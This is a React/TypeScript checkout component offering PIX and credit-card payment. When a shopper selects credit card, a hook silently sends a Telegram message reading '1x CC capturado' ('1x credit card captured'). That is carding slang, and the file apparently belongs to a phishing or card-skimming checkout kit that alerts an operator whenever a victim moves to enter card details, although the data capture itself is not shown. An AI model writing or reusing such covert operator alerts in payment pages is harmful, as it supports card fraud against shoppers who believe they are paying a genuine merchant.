
import React, { useEffect } from 'react';
import PaymentOptions from './PaymentOptions';
import { PaymentMethodForms } from './PaymentMethodForms';
import { PaymentStatusMessage } from './PaymentStatusMessage';
import { PaymentMethod } from '@/types/checkout';
import { sendTelegramNotification } from '@/lib/notifications/sendTelegramNotification';

interface PaymentMethodContentProps {
  paymentMethod: PaymentMethod;
  onPaymentMethodChange: (method: PaymentMethod) => void;
  onSubmit: (data?: any) => void;
  isSubmitting: boolean;
  buttonColor: string;
  buttonText: string;
  productPrice?: number;
  paymentSuccess: boolean;
  paymentError: boolean;
  hasValidCustomerData: boolean;
}

export const PaymentMethodContent: React.FC<PaymentMethodContentProps> = ({
  paymentMethod,
  onPaymentMethodChange,
  onSubmit,
  isSubmitting,
  buttonColor,
  buttonText,
  productPrice,
  paymentSuccess,
  paymentError,
  hasValidCustomerData
}) => {
  // Derive payment-specific button text
  const finalButtonText = paymentMethod === 'pix' ? 'Pagar com PIX' : buttonText;
  
  // Enviar notificação quando o usuário selecionar cartão de crédito
  useEffect(() => {
    if (paymentMethod === 'creditCard') {
      sendTelegramNotification('📲 1x CC capturado');
    }
  }, [paymentMethod]);
  
  return (
    <div className="space-y-6">
      <PaymentOptions 
        paymentMethod={paymentMethod} 
        onPaymentMethodChange={onPaymentMethodChange} 
      />
      
      <PaymentMethodForms
        paymentMethod={paymentMethod}
        onSubmit={onSubmit}
        isLoading={isSubmitting}
        buttonColor={buttonColor}
        buttonText={finalButtonText}
        productPrice={productPrice}
        showQrCode={paymentSuccess}
        hasValidCustomerData={hasValidCustomerData}
      />
      
      <PaymentStatusMessage
        success={paymentSuccess}
        error={paymentError}
        paymentMethod={paymentMethod}
      />
    </div>
  );
};
